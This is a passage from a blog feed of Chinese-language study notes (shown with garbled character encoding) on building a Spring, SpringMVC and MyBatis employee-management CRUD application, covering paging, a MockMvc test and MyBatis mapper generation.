//æŸ¥å‡ºæ‰€æœ‰çš„éƒ¨é—¨ä¿¡æ¯å¹¶æ˜¾ç¤ºåœ¨ä¸‹æ‹‰åˆ—è¡¨ä¸­</span></span><br><span class="line"><span class="xml">    function getDepts() &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">           url:"$&#123;APP_PATH&#125;/depts",</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                // console.log(result)</span></span><br><span class="line"><span class="xml">                //æ˜¾ç¤ºéƒ¨é—¨ä¿¡æ¯åœ¨ä¸‹æ‹‰åˆ—è¡¨ä¸­</span></span><br><span class="line"><span class="xml">                // $("#dept_add_select").append("")</span></span><br><span class="line"><span class="xml">                $.each(result.extend.depts,function () &#123;</span></span><br><span class="line"><span class="xml">                    var optionEle = $("<span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>").append(this.deptName).attr("value",this.deptId);</span></span><br><span class="line"><span class="xml">                    optionEle.appendTo("#dept_add_select")</span></span><br><span class="line"><span class="xml">                &#125;);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>è¿™æ ·ä¸€ä¸ªæ¨¡æ€æ¡†çš„æ–°å»ºåŠŸèƒ½å°±åšå¥½äº†</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰ç«¯é¡µé¢&quot;&gt;&lt;a href=&quot;#å‰ç«¯é¡µé¢&quot; class=&quot;headerlink&quot; title=&quot;å‰ç«¯é¡µé¢&quot;&gt;&lt;/a&gt;å‰ç«¯é¡µé¢&lt;/h1&gt;&lt;p&gt;æ ¹æ®å‰é¢çš„æ•ˆæœå›¾åšä¸€ä¸ªå‰ç«¯é¡µé¢&lt;br&gt;list.jsp:&lt;br&gt;&lt;figure class=&quot;highlight dust&quot;
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>SSM-2020/10/5-å‘˜å·¥ç®¡ç†ç³»ç»Ÿ-1</title>
    <link href="http://yoursite.com/2020/10/05/SSM-2020-10-5-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/10/05/SSM-2020-10-5-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-10-05T06:08:00.000Z</published>
    <updated>2021-02-21T04:58:00.409Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŠŸèƒ½ä¸€ï¼šæŸ¥è¯¢å‘˜å·¥æ•°æ®"><a href="#åŠŸèƒ½ä¸€ï¼šæŸ¥è¯¢å‘˜å·¥æ•°æ®" class="headerlink" title="åŠŸèƒ½ä¸€ï¼šæŸ¥è¯¢å‘˜å·¥æ•°æ®"></a>åŠŸèƒ½ä¸€ï¼šæŸ¥è¯¢å‘˜å·¥æ•°æ®</h1><ol><li><p>è®¿é—®index.jspé¡µé¢</p></li><li><p>index.jspé¡µé¢å‘é€å‡ºæŸ¥è¯¢å‘˜å·¥åˆ—è¡¨è¯·æ±‚</p></li><li><p>EmployeeControlleræ¥æ¥å—è¯·æ±‚ï¼ŒæŸ¥å‡ºå‘˜å·¥æ•°æ®</p></li><li><p>æ¥åˆ°list.jspé¡µé¢è¿›è¡Œå±•ç¤º</p></li></ol><ul><li>URI: /emps</li></ul><p>æ•ˆæœå›¾ï¼š<br><img src="/img/JavaWeb/10-5å­¦ä¹ æ—¥è®°/0.png" alt="avatar"></p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>é¦–å…ˆåˆ†æä¸€ä¸‹ï¼Œè¿™ä¸ªé¡µé¢ä¸€é¡µæœ‰5æ¡æ•°æ®ï¼Œè§„å®šäº†URIä¸º/empsï¼Œå¯ä»¥åˆ†é¡µæŸ¥è¯¢åˆ°æ‰€æœ‰æ•°æ®</p><p>é‚£ä¹ˆé¦–å…ˆå°±åœ¨index.jspä¸­ç¼–å†™<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:forward</span> <span class="attr">page</span>=<span class="string">"//emps"</span>&gt;</span><span class="tag">&lt;/<span class="name">jsp:forward</span>&gt;</span></span><br></pre></td></tr></table></figure><br>è®¿é—®é¦–é¡µæ—¶å°±ä¼šè½¬åˆ°/emps</p><p>è·Ÿéšé€»è¾‘ï¼Œindex.jspå‘é€åˆ—è¡¨è¯·æ±‚è¢«Controlleræ¥å—å¹¶æŸ¥å‡ºå‘˜å·¥æ•°æ®</p><p>EmployeeController<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.crud.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Employee;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.service.EmployeeService;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageHelper;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¤„ç†å‘˜å·¥CRUDè¯·æ±‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@<span class="type">Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmployeeController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    @<span class="type">Autowired</span></span><br><span class="line">    <span class="type">EmployeeService</span> employeeService;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŸ¥è¯¢å‘˜å·¥æ•°æ®(åˆ†é¡µæŸ¥è¯¢)</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    @<span class="type">RequestMapping</span>(<span class="string">"/emps"</span>)</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> getEmps(@<span class="type">RequestParam</span>(value = <span class="string">"pn"</span>,defaultValue = <span class="string">"1"</span>)<span class="type">Integer</span> pn, <span class="type">Model</span> model)&#123;</span><br><span class="line">        <span class="comment">//è¿™ä¸æ˜¯ä¸€ä¸ªåˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line">        <span class="comment">//å¼•å…¥PageHelperåˆ†é¡µæ’ä»¶</span></span><br><span class="line">        <span class="comment">//åœ¨æŸ¥è¯¢ä¹‹å‰åªéœ€è¦è°ƒç”¨,ä¼ å…¥é¡µç ä»¥åŠæ¯é¡µçš„ä¸ªæ•°</span></span><br><span class="line">        <span class="type">PageHelper</span>.startPage(pn,<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//startPageåé¢ç´§è·Ÿçš„è¿™ä¸ªæŸ¥è¯¢å°±æ˜¯ä¸€ä¸ªåˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line">        <span class="type">List</span>&lt;<span class="type">Employee</span>&gt; emps = employeeService.getAll();</span><br><span class="line">        <span class="comment">//ä½¿ç”¨PageInfoåŒ…è£…æŸ¥è¯¢åçš„ç»“æœï¼Œåªéœ€è¦å°†PageInfoäº¤ç»™é¡µé¢å°±è¡Œäº†</span></span><br><span class="line">        <span class="comment">//å°è£…äº†è¯¦ç»†çš„åˆ†é¡µä¿¡æ¯ï¼ŒåŒ…æ‹¬æœ‰æˆ‘ä»¬æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®,è¿ç»­æ˜¾ç¤ºçš„é¡µæ•°</span></span><br><span class="line">        <span class="type">PageInfo</span> page= new <span class="type">PageInfo</span>(emps,<span class="number">5</span>);</span><br><span class="line">        model.addAttribute(<span class="string">"pageInfo"</span>,page);</span><br><span class="line">        page.getNavigatepageNums();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"list"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™é‡Œä½¿ç”¨äº†PageHelperåˆ†é¡µæ’ä»¶æ¥è¿›è¡Œåˆ†é¡µï¼Œå…·ä½“ç™¾åº¦å°±è¡Œ</p><p>pnå°±æ˜¯é¡µç ï¼Œé»˜è®¤å€¼ä¸º1</p><p>å…ˆæš‚æ—¶ä¸æ”¾åœ¨é¡µé¢ä¸Šï¼Œæ‰€ä»¥å¯¹å…¶è¿›è¡Œä¸€ä¸‹å•å…ƒæµ‹è¯•</p><p>åœ¨teståŒ…ä¸‹æ–°å»ºä¸€ä¸ªMvcTest<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.crud.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Employee;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageInfo;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.mock.web.MockHttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.ContextConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringJUnit4ClassRunner;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.web.WebAppConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.MockMvc;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.MockMvcBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.MvcResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.request.MockMvcRequestBuilders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.setup.MockMvcBuilders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨Springæµ‹è¯•æ¨¡å—æä¾›çš„æµ‹è¯•è¯·æ±‚åŠŸèƒ½ï¼Œæµ‹è¯•crudè¯·æ±‚çš„æ­£ç¡®æ€§</span></span><br><span class="line"><span class="comment"> * Spring4æµ‹è¯•çš„æ—¶å€™ï¼Œéœ€è¦servlet3çš„æ”¯æŒ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="type">RunWith</span>(<span class="type">SpringJUnit4ClassRunner</span><span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">WebAppConfiguration</span></span></span><br><span class="line"><span class="class">@<span class="title">ContextConfiguration</span>(<span class="title">locations</span>=</span>&#123;<span class="string">"classpath:applicationContext.xml"</span>,<span class="string">"file:src/main/webapp/WEB-INF/dispatcherServlet-servlet.xml"</span>&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MVCTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">//ä¼ å…¥Springmvcçš„ioc</span></span><br><span class="line">    @<span class="type">Autowired</span></span><br><span class="line">    <span class="type">WebApplicationContext</span> context;</span><br><span class="line">    <span class="comment">//è™šæ‹Ÿmvcè¯·æ±‚ï¼Œè·å–åˆ°å¤„ç†ç»“æœ</span></span><br><span class="line">    <span class="type">MockMvc</span> mockMvc;</span><br><span class="line"></span><br><span class="line">    @<span class="type">Before</span></span><br><span class="line">    <span class="keyword">public</span> void initMokcMvc()&#123;</span><br><span class="line">        mockMvc = <span class="type">MockMvcBuilders</span>.webAppContextSetup(context).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="type">Test</span></span><br><span class="line">    <span class="keyword">public</span> void testPage() <span class="keyword">throws</span> <span class="type">Exception</span> &#123;</span><br><span class="line">        <span class="comment">//æ¨¡æ‹Ÿè¯·æ±‚æ‹¿åˆ°è¿”å›å€¼</span></span><br><span class="line">        <span class="type">MvcResult</span> result = mockMvc.perform(<span class="type">MockMvcRequestBuilders</span>.<span class="keyword">get</span>(<span class="string">"/emps"</span>).param(<span class="string">"pn"</span>, <span class="string">"5"</span>)).andReturn();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¯·æ±‚æˆåŠŸä»¥åï¼Œè¯·æ±‚åŸŸä¸­ä¼šæœ‰PageInfo,æˆ‘ä»¬å¯ä»¥å–å‡ºPageInfoè¿›è¡ŒéªŒè¯</span></span><br><span class="line">        <span class="type">MockHttpServletRequest</span> request = result.getRequest();</span><br><span class="line">        <span class="type">PageInfo</span> pi = (<span class="type">PageInfo</span>) request.getAttribute(<span class="string">"pageInfo"</span>);</span><br><span class="line">        <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"å½“å‰é¡µç ï¼š"</span>+pi.getPageNum());</span><br><span class="line">        <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"æ€»é¡µç :"</span>+pi.getPages());</span><br><span class="line">        <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"æ€»è®°å½•æ•°"</span>+pi.getTotal());</span><br><span class="line">        <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"åœ¨é¡µé¢éœ€è¦è¿ç»­æ˜¾ç¤ºçš„é¡µç "</span>);</span><br><span class="line">        int[] nums = pi.getNavigatepageNums();</span><br><span class="line">        <span class="keyword">for</span>(int i:nums)&#123;</span><br><span class="line">            <span class="type">System</span>.out.<span class="built_in">print</span>(<span class="string">" "</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">System</span>.out.<span class="built_in">println</span>();</span><br><span class="line">        <span class="comment">//è·å–å‘˜å·¥æ•°æ®</span></span><br><span class="line">        <span class="type">List</span>&lt;<span class="type">Employee</span>&gt; list = pi.getList();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">Employee</span> employee : list)&#123;</span><br><span class="line">            <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"ID"</span>+employee.getEmpId()+<span class="string">"==&gt;Name"</span>+employee.getEmpName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™é‡Œè¸©äº†ä¸ªå‘ï¼Œè¦æ³¨æ„çš„æ˜¯pom.xmlä¸­çš„c3p0å¯èƒ½ä¼šå› ä¸ºç‰ˆæœ¬é—®é¢˜æŠ¥é”™ï¼Œä¿®æ”¹æˆ<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">type</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>é‡å¯åŠ è½½ä¾èµ–å³å¯</p><p>è¿è¡Œç»“æœ<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">å½“å‰é¡µç ï¼š5</span><br><span class="line"><span class="section">æ€»é¡µç :250</span></span><br><span class="line">æ€»è®°å½•æ•°1248</span><br><span class="line">åœ¨é¡µé¢éœ€è¦è¿ç»­æ˜¾ç¤ºçš„é¡µç </span><br><span class="line"> 3 4 5 6 7</span><br><span class="line">ID21==&gt;Namedffa319</span><br><span class="line">ID22==&gt;Name31b4020</span><br><span class="line">ID23==&gt;Name4fc7c21</span><br><span class="line">ID24==&gt;Name9b3c422</span><br><span class="line">ID25==&gt;Namef878c23</span><br></pre></td></tr></table></figure><br>è¿™é‡Œçœ‹åˆ°å½“å‰é¡µç ï¼Œæ€»é¡µç ï¼Œæ€»è®°å½•æ•°ï¼Œéœ€è¦è¿ç»­æ˜¾ç¤ºçš„é¡µç ä»¥åŠæ•°æ®éƒ½å·²ç»èƒ½æˆåŠŸæ•è·åˆ°äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥åªéœ€è¦å†™é¡µé¢è¿›è¡Œå±•ç¤ºå³å¯</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;åŠŸèƒ½ä¸€ï¼šæŸ¥è¯¢å‘˜å·¥æ•°æ®&quot;&gt;&lt;a href=&quot;#åŠŸèƒ½ä¸€ï¼šæŸ¥è¯¢å‘˜å·¥æ•°æ®&quot; class=&quot;headerlink&quot; title=&quot;åŠŸèƒ½ä¸€ï¼šæŸ¥è¯¢å‘˜å·¥æ•°æ®&quot;&gt;&lt;/a&gt;åŠŸèƒ½ä¸€ï¼šæŸ¥è¯¢å‘˜å·¥æ•°æ®&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;è®¿é—®index.jspé¡µé¢&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>SSM-2020/9/21-Mybatis</title>
    <link href="http://yoursite.com/2020/09/21/SSM-2020-9-21-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/09/21/SSM-2020-9-21-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-09-21T11:14:51.000Z</published>
    <updated>2021-02-21T04:58:02.312Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Mybatisè¿è¡Œ"><a href="#Mybatisè¿è¡Œ" class="headerlink" title="Mybatisè¿è¡Œ"></a>Mybatisè¿è¡Œ</h1><p>é¦–å…ˆè¿è¡Œä¸€ä¸‹MyBatisç”Ÿæˆä¸€ä¸‹mapperæ–‡ä»¶<br>å»ºä¸€ä¸ªjavaæ–‡ä»¶<br>MBGTest.java<br><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.crud.test;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.api.MyBatisGenerator;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.config.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.config.xml.ConfigurationParser;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.exception.InvalidConfigurationException;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.exception.XMLParserException;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.internal.DefaultShellCallback;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MBGTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="keyword">String</span>[] args) throws IOException, XMLParserException, InvalidConfigurationException, SQLException, InterruptedException &#123;</span><br><span class="line">        List&lt;<span class="keyword">String</span>&gt; warnings = <span class="keyword">new</span> <span class="type">ArrayList</span>&lt;<span class="keyword">String</span>&gt;();</span><br><span class="line">        boolean overwrite = <span class="literal">true</span>;</span><br><span class="line">        File configFile = <span class="keyword">new</span> <span class="type">File</span>(<span class="string">"F:\\default\\SSM\\src\\main\\resources\\generatorConfig.xml"</span>);</span><br><span class="line">        ConfigurationParser cp = <span class="keyword">new</span> <span class="type">ConfigurationParser</span>(warnings);</span><br><span class="line">        Configuration config = cp.parseConfiguration(configFile);</span><br><span class="line">        DefaultShellCallback callback = <span class="keyword">new</span> <span class="type">DefaultShellCallback</span>(overwrite);</span><br><span class="line">        MyBatisGenerator myBatisGenerator = <span class="keyword">new</span> <span class="type">MyBatisGenerator</span>(config, callback, warnings);</span><br><span class="line">        myBatisGenerator.generate(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æ³¨æ„è¦ä¿®æ”¹è·¯å¾„</p><p>è¿è¡Œä¹‹åï¼Œmapperå’Œdaoä¸­å°±ä¼šå‡ºç°ä¸¤ä¸ªæ–‡ä»¶</p><p>beanä¸‹ä¹Ÿä¼šå‡ºç°ç›¸åº”çš„æ–‡ä»¶</p><h1 id="å®ç°å¤šè¡¨è”åˆæŸ¥è¯¢"><a href="#å®ç°å¤šè¡¨è”åˆæŸ¥è¯¢" class="headerlink" title="å®ç°å¤šè¡¨è”åˆæŸ¥è¯¢"></a>å®ç°å¤šè¡¨è”åˆæŸ¥è¯¢</h1><p>ç”Ÿæˆä¹‹åçš„æ–‡ä»¶ä»¥åŠæŸ¥è¯¢æ–¹æ³•ï¼Œä¸å¤ªèƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€è¦ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¸€äº›æ›´æ”¹ï¼Œæ¥æ»¡è¶³é€šè¿‡éƒ¨é—¨ä¿¡æ¯å°±èƒ½æŸ¥è¯¢å‡ºæ¥ï¼Œå®ç°ä¸€ä¸ªå¤šè¡¨è”åˆæŸ¥è¯¢</p><p>åœ¨daoåŒ…ä¸‹çš„EmployeeMapper.javaä¸­<br>æ·»åŠ ä¸Š:<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Employee&gt; selectByExampleWithDept(<span class="name">EmployeeExample</span> example)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">Employee selectByPrimaryKeyWithDept(<span class="name">Integer</span> empId)<span class="comment">;</span></span><br></pre></td></tr></table></figure><br>å¹¶åœ¨beanåŒ…ä¸‹çš„Emplotee.javaå‘˜å·¥ä¿¡æ¯ä¸­æ·»åŠ <br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private Department  department<span class="comment">;</span></span><br></pre></td></tr></table></figure><br>å¹¶åŠ ä¸Šgetterå’Œsetter</p><p>åœ¨EmployeeMapper.xml æ·»åŠ sqlæ ‡ç­¾<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;sql id=<span class="string">"WithDept_Column_List"</span>&gt;</span><br><span class="line">  e<span class="selector-class">.emp_id</span>, e<span class="selector-class">.emp_name</span>, e<span class="selector-class">.gender</span>, e<span class="selector-class">.email</span>, e<span class="selector-class">.d_id</span>, d<span class="selector-class">.dept_id</span>, d.dept_name</span><br><span class="line">&lt;/sql&gt;</span><br></pre></td></tr></table></figure></p><p>æ¥ç€æ·»åŠ æŸ¥è¯¢æ–¹æ³•<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">select</span> id=<span class="string">"selectByExampleWithDept"</span> &gt;</span><br><span class="line"> <span class="keyword">select</span></span><br><span class="line">  &lt;<span class="keyword">if</span> test=<span class="string">"distinct"</span>&gt;</span><br><span class="line">    <span 